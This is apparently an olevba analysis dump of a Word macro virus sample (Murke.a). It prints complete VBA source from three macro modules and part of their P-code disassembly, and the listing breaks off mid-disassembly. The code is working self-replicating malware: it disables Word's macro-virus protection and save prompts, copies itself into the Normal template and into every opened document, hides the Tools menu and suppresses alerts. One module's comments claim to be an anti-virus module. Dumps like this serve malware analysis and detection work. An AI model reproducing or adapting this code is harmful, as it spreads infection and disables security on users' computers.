olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Murke.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Murke.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'*************************************************************************
'Murka - Это самый маленький из всех известных МакроАнтивирусных модулей!
'Принцип действия: Загружается вместе с документом и блокирует
'                 распространение зараженных модулей
'
'Условия распространения: Freeware(Свободно)
'Достоинства:             Корректная работа, надежность!
'Недостатки:              Пока не нашел
'
'"Все это, конечно, хорошо, но я ни хрена не понял, как его
' можно преобрести?!" - гневно скажешь ты. Можно!
'Дед MustDie вам все раскажет!
'Необходимо лишь открыть документ на персональном
'компе. где уже установлен антивирусный модуль Murka.
'
'Автору:   mustdie@chat.ru
'Murke:    murka@chat.ru
'Данилову: antivir@dials.ru
'*************************************************************************
On Error Resume Next
Dim s As Boolean
Dim i As Long
Dim j As Long
Dim Murka As String
Dim Other As String
Dim str As String
  s = ActiveDocument.Saved
  Application.EnableCancelKey = wdCancelDisabled
  With Options: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
  str = "Document_Close"
  With MacroContainer.VBProject.VBComponents.Item(1).CodeModule
    i = .ProcBodyLine(str, vbext_pk_Proc)
    j = .ProcCountLines(str, vbext_pk_Proc)
    Murka = .Lines(i, j)
  End With
  With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
    i = .ProcBodyLine(str, vbext_pk_Proc)
    j = .ProcCountLines(str, vbext_pk_Proc)
    Other = .Lines(i, j)
    If Other <> Murka And Murka <> "" Then
      .DeleteLines i, j
      .InsertLines 1, Murka
      NormalTemplate.Save
    End If
  End With
  With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
    i = .ProcBodyLine(str, vbext_pk_Proc)
    j = .ProcCountLines(str, vbext_pk_Proc)
    Other = .Lines(i, j)
    If Other <> Murka And Murka <> "" Then
      .DeleteLines i, j
      .InsertLines 1, Murka
      Randomize
      If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Murka3": .Author = "M&M": .Execute: End With
      If Left(ActiveDocument.Name, 8) = "Document" Or Left(ActiveDocument.Name, 8) = "Документ" Then
      Else
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
      End If
    End If
  End With
  If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub
-------------------------------------------------------------------------------
VBA MACRO TheSecond.bas 
in file: ./Virus.MSWord.Murke.a - OLE stream: 'Macros/VBA/TheSecond'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
  Copyrights = "The Second, 2000"
  NickName = "Revenger"
  Options.VirusProtection = False
  flag = False
  If Documents.Count >= 1 Then
    counter = NormalTemplate.VBProject.VBComponents.Count
    For i = 1 To counter
      If NormalTemplate.VBProject.VBComponents.Item(i).Name = "TheSecond" Then flag = True
    Next i
    x = Application.StartupPath + "\TheSecond.tmp"
    If Not flag Then
      ActiveDocument.VBProject.VBComponents("TheSecond").Export (x)
      NormalTemplate.VBProject.VBComponents.Import (x)
    End If
    flag = False
    infected = False
    havesave = ActiveDocument.Saved
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
      If ActiveDocument.VBProject.VBComponents.Item(i).Name = "TheSecond" Then flag = True
    Next i
    If Not flag Then
      NormalTemplate.VBProject.VBComponents("TheSecond").Export (x)
      ActiveDocument.VBProject.VBComponents.Import (x)
      infected = True
    End If
    If havesave And infected And (Left(ActiveDocument.Name, 8) <> "Документ") Then
      Dialogs(wdDialogFileSaveAs).Execute
    End If
    ActiveDocument.Saved = havesave
  End If
End Sub
Sub FilePrint()
  Selection.Find.ClearFormatting
  Selection.Find.Replacement.ClearFormatting
  With Selection.Find
    .Text = "Нюбин"
    .Replacement.Text = "Нудин"
    .Forward = True
    .Wrap = wdFindContinue
    .Format = False
    .MatchCase = False
    .MatchWholeWord = False
    .MatchWildcards = False
  End With
  Selection.Find.Execute Replace:=wdReplaceAll
  Dialogs(wdDialogFilePrint).Show
  Selection.Find.ClearFormatting
  Selection.Find.Replacement.ClearFormatting
  With Selection.Find
    .Text = "Нудин"
    .Replacement.Text = "Нюбин"
    .Forward = True
    .Wrap = wdFindContinue
    .Format = False
    .MatchCase = False
    .MatchWholeWord = False
    .MatchWildcards = False
  End With
  Selection.Find.Execute Replace:=wdReplaceAll
End Sub
Sub ToolsMacro()
  Dialogs(wdDialogToolsMacro).Display
End Sub
Sub ViewVBCode()
  MsgBox ("Нет загруженных макросов!")
End Sub
-------------------------------------------------------------------------------
VBA MACRO bdoc2.bas 
in file: ./Virus.MSWord.Murke.a - OLE stream: 'Macros/VBA/bdoc2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(i).Name = "bdoc2" Then NormInstall = True
Next i
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(i).Name = "bdoc2" Then ActivInstall = True
Next i
If ActivInstall = True And NormInstall = True Then GoTo Label_Exit
If ActivInstall = True And NormInstall = False Then Set Doc = ActiveDocument
If ActivInstall = False And NormInstall = True Then Set Doc = NormalTemplate
Doc.VBProject.VBComponents("bdoc2").Export ("c:\bdoc2.txt")

If ActiveInstall = True And NormInstall = False Then
NormalTemplate.VBProject.VBComponents.Import ("c:\bdoc2.txt")
NormalTemplate.Save
Else
Dname = ActiveDocument.FullName
If Left$(Dname, 8) = "Document" Then GoTo Label_Exit
ActiveDocument.VBProject.VBComponents.Import ("c:\bdoc2.txt")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End If

Label_Exit:
CommandBars("Tools").Enabled = False
Application.ScreenUpdating = True
Application.DisplayAlerts = wdAlertsAll
Application.EnableCancelKey = wdCancelInterrupt
End Sub
Sub AutoClose()
On Error Resume Next
If Day(Now) = 2 And Month(Now) = 9 Then MsgBox "УАФ¶µДЧЈёЈ , ЙъИХїмАЦ!!!", vbCritical
Application.DisplayAlerts = wdAlertsNone
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(i).Name = "bdoc2" Then NormInstall = True
Next i
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "bdoc2" Then ActiveInstall = True
Next i
If ActiveInstall = True And NormInstall = True Then GoTo Label_Exit
If ActiveInstall = True And NormInstall = False Then
NormalTemplate.VBProject.VBComponents.Import ("c:\bdoc2.txt")
NormalTemplate.Save
Else
Dname = ActiveDocument.FullName
If Left$(Dname, 8) = "Document" Then GoTo Label_Exit
ActiveDocument.VBProject.VBComponents.Import ("c:\bdoc2.txt")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End If
Label_Exit:
End Sub

Public Sub AutoExec()
On Error Resume Next
CommandBars("Tools").Enabled = False
Application.DisplayAlerts = wdAlertsNone
Application.ScreenUpdating = False
Options.VirusProtection = False
End Sub
Sub AutoExit()
On Error Resume Next
Kill ("c:\bdoc2.txt")
If Day(Now) = 13 Then MsgBox "ЗлК№УГµБ°жИнјю,Press OK!!", vbCritical
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Murke.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 9895 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	QuoteRem 0x0000 0x0049 "*************************************************************************"
' Line #2:
' 	QuoteRem 0x0000 0x0048 "Murka - Это самый маленький из всех известных МакроАнтивирусных модулей!"
' Line #3:
' 	QuoteRem 0x0000 0x003D "Принцип действия: Загружается вместе с документом и блокирует"
' Line #4:
' 	QuoteRem 0x0000 0x0033 "                 распространение зараженных модулей"
' Line #5:
' 	QuoteRem 0x0000 0x0000 ""
' Line #6:
' 	QuoteRem 0x0000 0x002B "Условия распространения: Freeware(Свободно)"
' Line #7:
' 	QuoteRem 0x0000 0x0037 "Достоинства:             Корректная работа, надежность!"
' Line #8:
' 	QuoteRem 0x0000 0x0026 "Недостатки:              Пока не нашел"
' Line #9:
' 	QuoteRem 0x0000 0x0000 ""
' Line #10:
' 	QuoteRem 0x0000 0x003A ""Все это, конечно, хорошо, но я ни хрена не понял, как его"
' Line #11:
' 	QuoteRem 0x0000 0x0030 " можно преобрести?!" - гневно скажешь ты. Можно!"
' Line #12:
' 	QuoteRem 0x0000 0x001D "Дед MustDie вам все раскажет!"
' Line #13:
' 	QuoteRem 0x0000 0x0030 "Необходимо лишь открыть документ на персональном"
' Line #14:
' 	QuoteRem 0x0000 0x0034 "компе. где уже установлен антивирусный модуль Murka."
' Line #15:
' 	QuoteRem 0x0000 0x0000 ""
' Line #16:
' 	QuoteRem 0x0000 0x0019 "Автору:   mustdie@chat.ru"
' Line #17:
' 	QuoteRem 0x0000 0x0017 "Murke:    murka@chat.ru"
' Line #18:
' 	QuoteRem 0x0000 0x001A "Данилову: antivir@dials.ru"
' Line #19:
' 	QuoteRem 0x0000 0x0049 "*************************************************************************"
' Line #20:
' 	OnError (Resume Next) 
' Line #21:
' 	Dim 
' 	VarDefn s (As Boolean)
' Line #22:
' 	Dim 
' 	VarDefn i (As Long)
' Line #23:
' 	Dim 
' 	VarDefn j (As Long)
' Line #24:
' 	Dim 
' 	VarDefn Murka (As String)
' Line #25:
' 	Dim 
' 	VarDefn Other (As String)
' Line #26:
' 	Dim 
' 	VarDefn str (As String)
' Line #27:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St s 
' Line #28:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #29:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #30:
' 	LitStr 0x000E "Document_Close"
' 	St str 
' Line #31:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #32:
' 	Ld str 
' 	Ld vbext_pk_Proc 
' 	ArgsMemLdWith ProcBodyLine 0x0002 
' 	St i 
' Line #33:
' 	Ld str 
' 	Ld vbext_pk_Proc 
' 	ArgsMemLdWith ProcCountLines 0x0002 
' 	St j 
' Line #34:
' 	Ld i 
' 	Ld j 
' 	ArgsMemLdWith Lines 0x0002 
' 	St Murka 
' Line #35:
' 	EndWith 
' Line #36:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #37:
' 	Ld str 
' 	Ld vbext_pk_Proc 
' 	ArgsMemLdWith ProcBodyLine 0x0002 
' 	St i 
' Line #38:
' 	Ld str 
' 	Ld vbext_pk_Proc 
' 	ArgsMemLdWith ProcCountLines 0x0002 
' 	St j 
' Line #39:
' 	Ld i 
' 	Ld j 
' 	ArgsMemLdWith Lines 0x0002 
' 	St Other 
' Line #40:
' 	Ld Other 
' 	Ld Murka 
' 	Ne 
' 	Ld Murka 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	IfBlock 
' Line #41:
' 	Ld i 
' 	Ld j 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #42:
' 	LitDI2 0x0001 
' 	Ld Murka 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #43:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	EndWith 
' Line #46:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #47:
' 	Ld str 
' 	Ld vbext_pk_Proc 
' 	ArgsMemLdWith ProcBodyLine 0x0002 
' 	St i 
' Line #48:
' 	Ld str 
' 	Ld vbext_pk_Proc 
' 	ArgsMemLdWith ProcCountLines 0x0002 
' 	St j 
' Line #49:
' 	Ld i 
' 	Ld j 
' 	ArgsMemLdWith Lines 0x0002 
' 	St Other 
' Line #50:
' 	Ld Other 
' 	Ld Murka 
' 	Ne 
' 	Ld Murka 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	IfBlock 
' Line #51:
' 	Ld i 
' 	Ld j 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #52:
' 	LitDI2 0x0001 
' 	Ld Murka 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #53:
' 	ArgsCall Read 0x0000 
' Line #54:
' 	Ld Rnd 
' 	LitR8 0x3333 0x3333 0x3333 0x3FD3 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' 	BoS 0x0000 
' 	LitStr 0x0006 "Murka3"
' 	MemStWith Title 
' 	BoS 0x0000 
' 	LitStr 0x0003 "M&M"
' 	MemStWith Author 
' 	BoS 0x0000 
' 	ArgsMemCallWith Execute 0x0000 
' 	BoS 0x0000 
' 	EndWith 
' 	EndIf 
' Line #55:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Документ"
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #56:
' 	ElseBlock 
' Line #57:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #58:
' 	EndIfBlock 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	EndWith 
' Line #61:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld s 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld s 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #62:
' 	EndSub 
' Macros/VBA/TheSecond - 7503 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	LitStr 0x0010 "The Second, 2000"
' 	St Copyrights 
' Line #2:
' 	LitStr 0x0008 "Revenger"
' 	St NickName 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitVarSpecial (False)
' 	St flag 
' Line #5:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #6:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St counter 
' Line #7:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld counter 
' 	For 
' Line #8:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "TheSecond"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St flag 
' 	EndIf 
' Line #9:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #10:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000E "\TheSecond.tmp"
' 	Add 
' 	St x 
' Line #11:
' 	Ld flag 
' 	Not 
' 	IfBlock 
' Line #12:
' 	Ld x 
' 	Paren 
' 	LitStr 0x0009 "TheSecond"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #13:
' 	Ld x 
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	LitVarSpecial (False)
' 	St flag 
' Line #16:
' 	LitVarSpecial (False)
' 	St infected 
' Line #17:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St havesave 
' Line #18:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #19:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "TheSecond"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St flag 
' 	EndIf 
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #21:
' 	Ld flag 
' 	Not 
' 	IfBlock 
' Line #22:
' 	Ld x 
' 	Paren 
' 	LitStr 0x0009 "TheSecond"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #23:
' 	Ld x 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #24:
' 	LitVarSpecial (True)
' 	St infected 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	Ld havesave 
' 	Ld infected 
' 	And 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Документ"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #27:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Execute 0x0000 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	Ld havesave 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	EndSub 
' Line #32:
' 	FuncDefn (Sub FilePrint())
' Line #33:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #34:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #35:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #36:
' 	LitStr 0x0005 "Нюбин"
' 	MemStWith Then 
' Line #37:
' 	LitStr 0x0005 "Нудин"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #38:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #39:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #40:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #41:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #42:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #43:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #44:
' 	EndWith 
' Line #45:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #46:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #47:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #48:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #49:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #50:
' 	LitStr 0x0005 "Нудин"
' 	MemStWith Then 
' Line #51:
' 	LitStr 0x0005 "Нюбин"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #52:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #53:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #54:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #55:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #56:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #57:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #58:
' 	EndWith 
' Line #59:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #60:
' 	EndSub 
' Line #61:
' 	FuncDefn (Sub ToolsMacro())
' Line #62:
' 	Ld wdDialogToolsMacro 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Display 0x0000 
' Line #63:
' 	EndSub 
' Line #64:
' 	FuncDefn (Sub ViewVBCode())
' Line #65:
' 	LitStr 0x0019 "Нет загруженных макросов!"
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #66:
' 	EndSub 
' Macros/VBA/bdoc2 - 8471 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #5:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #6:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "bdoc2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormInstall 
' 	EndIf 
' Line #7:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #8:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #9:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "bdoc2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ActivInstall 
' 	EndIf 
' Line #10:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #11:
' 	Ld ActivInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo Label_Exit 
' 	EndIf 
' Line #12:
' 	Ld ActivInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Doc 
' 	EndIf 
' Line #13:
' 	Ld ActivInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set Doc 
' 	EndIf 
' Line #14:
' 	LitStr 0x000C "c:\bdoc2.txt"
' 	Paren 
' 	LitStr 0x0005 "bdoc2"
' 	Ld Doc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #15:
' Line #16:
' 	Ld ActiveInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #17:
' 	LitStr 0x000C "c:\bdoc2.txt"
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #18:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #19:
' 	ElseBlock 
' Line #20:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St Dname 
' Line #21:
' 	Ld Dname 
' 	LitDI2 0x0008 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x0008 "Document"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Label_Exit 
' 	EndIf 
' Line #22:
' 	LitStr 0x000C "c:\bdoc2.txt"
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #23:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #24:
' 	EndIfBlock 
' Line #25:
' Line #26:
' 	Label Label_Exit 
' Line #27:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #28:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #29:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #30:
' 	Ld wdCancelInterrupt 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #31:
' 	EndSub 
' Line #32:
' 	FuncDefn (Sub AutoClose())
' Line #33:
' 	OnError (Resume Next) 
' Line #34:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0009 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0018 "УАФ¶µДЧЈёЈ , ЙъИХїмАЦ!!!"
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' 	EndIf 
' Line #35:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #36:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #37:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "bdoc2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormInstall 
' 	EndIf 
' Line #38:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #39:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #40:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "bdoc2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ActiveInstall 
' 	EndIf 
' Line #41:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #42:
' 	Ld ActiveInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo Label_Exit 
' 	EndIf 
' Line #43:
' 	Ld ActiveInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #44:
' 	LitStr 0x000C "c:\bdoc2.txt"
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #45:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #46:
' 	ElseBlock 
' Line #47:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St Dname 
' Line #48:
' 	Ld Dname 
' 	LitDI2 0x0008 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x0008 "Document"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Label_Exit 
' 	EndIf 
' Line #49:
' 	LitStr 0x000C "c:\bdoc2.txt"
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #50:
' 	Ld ActiveDocument 
